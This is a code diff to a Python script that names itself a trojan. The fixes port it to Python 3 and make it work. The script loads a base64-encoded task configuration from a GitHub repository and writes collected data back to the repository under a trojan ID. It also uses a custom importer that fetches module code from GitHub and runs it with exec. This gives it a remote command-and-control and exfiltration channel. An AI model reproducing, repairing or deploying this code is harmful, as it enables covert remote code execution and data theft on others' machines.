@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import json
 import base64
 import sys
@@ -37,13 +39,13 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
-    tree = branch.commit.commit.tree.recourse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
 
     for filename in tree.tree:
 
-        if filepath in tree.tree:
+        if filepath in filename.path:
 
-            print('[*] Found file %s', % filepath)
+            print('[*] Found file %s' % filepath)
             blob = repo.blob(filename._json_data['sha'])
             
             return blob.content
@@ -56,7 +58,7 @@ def get_trojan_config():
     global configured
 
     config_json = get_file_contents(trojan_config)
-    config = json.loads(base64.b64decode(config.json))
+    config = json.loads(base64.b64decode(config_json))
     configured = True
 
     for task in config:
@@ -72,7 +74,7 @@ def store_module_result(data):
     gh, repo, branch = connect_to_github()
 
     remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
-    repo.create_file(remote_path, 'Confirmation message', base64.b64encode(data))
+    repo.create_file(remote_path, 'Confirmation message', base64.b64encode(data.encode()))
 
     return
 
@@ -102,7 +104,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec self.current_module_code in module.__dict__
+        exec(self.current_module_code, module.__dict__)
         sys.modules[name] = module
 
         return module
